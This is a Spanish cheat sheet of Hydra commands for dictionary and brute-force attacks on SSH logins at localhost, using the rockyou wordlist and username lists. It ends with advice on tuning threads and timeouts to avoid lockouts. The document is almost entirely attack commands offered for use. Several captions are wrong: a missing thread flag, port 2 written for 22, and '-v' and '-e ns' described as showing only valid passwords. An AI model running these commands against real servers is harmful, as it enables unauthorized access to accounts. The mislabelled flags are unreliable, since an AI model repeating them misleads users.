Comprobar usuario user1 con contraseña iloveyou en ssh://localhost:22

`hydra -l user1 -p iloveyou ssh://localhost:22`

Comprobar usuario user1 con diccionario en ssh://localhost:22 con 4 hilos

`hydra -l user1 -P /rockyou.txt ssh://localhost:22`

Comprobar usuarios y contraseña con diccionarios en ssh://localhost:22

`hydra -L /usernames.txt -P /rockyou.txt ssh://localhost:2`

Comprobar usuarios y contraseña con diccionarios en ssh://localhost:22 con 4 hilos, evitando bloqueo

`hydra -L /usernames.txt -P /rockyou.txt ssh://localhost -t 4`

Comprobar usuarios y contraseña con diccionarios en ssh://localhost:22 con 4 hilos, evitando bloqueo y mostrando solo las contraseñas correctas

`hydra -L /usernames.txt -P /rockyou.txt ssh://localhost -t 4 -v`

Comprobar usuarios y contraseña con diccionarios en ssh://localhost:22 con 4 hilos, evitando bloqueo y mostrando solo las contraseñas correctas y guardando los resultados en un archivo

`hydra -L /usernames.txt -P /rockyou.txt ssh://localhost -t 4 -v -o /tmp/hydra.txt`

Comprobar usuarios y contraseña con diccionarios en ssh://localhost:22 con 4 hilos, evitando bloqueo y mostrando solo las contraseñas correctas y guardando los resultados en un archivo y mostrando solo las contraseñas correctas

`hydra -L /usernames.txt -P /rockyou.txt ssh://localhost -t 4 -v -o /tmp/hydra.txt -e ns`

Debemos ajustar siempre los threads y el tiempo de espera para evitar bloqueos y no saturar el servidor:

`hydra -L /usernames.txt -P /rockyou.txt ssh://localhost -t 8 -w 30 -v -o /tmp/hydra.txt`